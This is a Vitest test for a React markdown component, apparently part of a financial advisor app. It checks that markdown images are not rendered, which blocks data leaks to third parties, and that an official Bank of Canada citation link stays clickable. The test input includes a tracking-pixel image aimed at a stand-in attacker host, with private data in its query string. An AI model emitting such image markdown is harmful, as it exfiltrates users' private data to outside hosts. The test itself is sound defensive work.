// @vitest-environment jsdom
import { it, expect, afterEach } from "vitest";
import { render, screen, cleanup } from "@testing-library/react";
import AdvisorMarkdown from "../app/components/AdvisorMarkdown";
afterEach(cleanup);
it("网页或模型的图片不能自动向第三方发送数据，官方引用保持可点击", () => {
  render(
    <AdvisorMarkdown text="![tracking](https://evil.test/pixel?private=500)\n\n[官方引用](https://www.bankofcanada.ca/)" />,
  );
  expect(document.querySelector("img")).toBeNull();
  expect(
    screen.getByRole("link", { name: "官方引用" }).getAttribute("href"),
  ).toBe("https://www.bankofcanada.ca/");
});
